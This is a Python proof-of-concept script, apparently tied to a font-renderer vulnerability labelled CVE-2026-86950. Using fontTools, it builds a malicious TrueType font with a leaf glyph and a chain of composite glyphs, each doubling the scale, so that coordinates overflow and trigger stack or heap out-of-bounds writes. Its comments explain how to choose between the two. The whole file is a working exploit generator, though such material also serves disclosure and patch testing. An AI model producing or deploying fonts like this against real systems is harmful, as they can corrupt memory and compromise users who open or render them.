#!/usr/bin/env python3
"""CVE-2026-86950 trigger font.

One leaf glyph with two contours (a small rect for the bbox, and a
two-point line at x=32000 for the sat/trunc mismatch); nine composites
each scaling the previous by ~2 so the leaf's x reaches ~16M font units.
At Tf=1024, upm=16384: device_x = 16M * 1024/16384 ~ 1M -> 4096*1M > 2^31.

Requires: uv pip install fonttools
"""
import sys
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

UPM   = 16384
N     = 9
SCALE = 32767 / 16384          # F2Dot14 max, ~1.99994
DX    = 33                     # leaf rect width; scaled ×2⁹ → width_px ≈ DX·32
                               #   DX ≤ 31 → alloca (stack OOB)
                               #   DX ≥ 32 → malloc (heap OOB)

fb = FontBuilder(UPM, isTTF=True)
names = [".notdef", "leaf"] + [f"c{i}" for i in range(N - 1)] + ["A"]
fb.setupGlyphOrder(names)
fb.setupCharacterMap({ord("A"): "A"})

# leaf: contour 0 sets bbox_x (→ coverage-buffer size); contour 1 is the 2-pt trigger
p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((DX, 0));  p.lineTo((DX, 40));  p.lineTo((0, 40));  p.closePath()
p.moveTo((32000, 1));  p.lineTo((32000, 39));  p.closePath()
glyf = {"leaf": p.glyph()}

# .notdef (CG requires one)
p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((1, 0));  p.lineTo((1, 1));  p.closePath()
glyf[".notdef"] = p.glyph()

# composite chain: A -> c7 -> c6 -> ... -> c0 -> leaf, each x2
gs = dict.fromkeys(names)
prev = "leaf"
for name in names[2:]:
    p = TTGlyphPen(gs)
    p.addComponent(prev, (SCALE, 0, 0, SCALE, 0, 0))
    glyf[name] = p.glyph()
    prev = name

fb.setupGlyf(glyf)
fb.setupHorizontalMetrics({n: (100, 0) for n in names})
fb.setupHorizontalHeader(ascent=100, descent=-100)
fb.setupOS2()
fb.setupNameTable({"familyName": "T", "styleName": "R"})
fb.setupPost()
fb.font["maxp"].maxComponentDepth = N
fb.font.recalcBBoxes = False          # composite bbox would overflow int16
for g in glyf.values():
    g.xMin = g.yMin = 0; g.xMax = DX; g.yMax = 40
fb.font["head"].xMin = 0; fb.font["head"].xMax = DX
fb.font["head"].yMin = 0; fb.font["head"].yMax = 40

fb.save(sys.argv[1] if len(sys.argv) > 1 else "trigger.ttf")
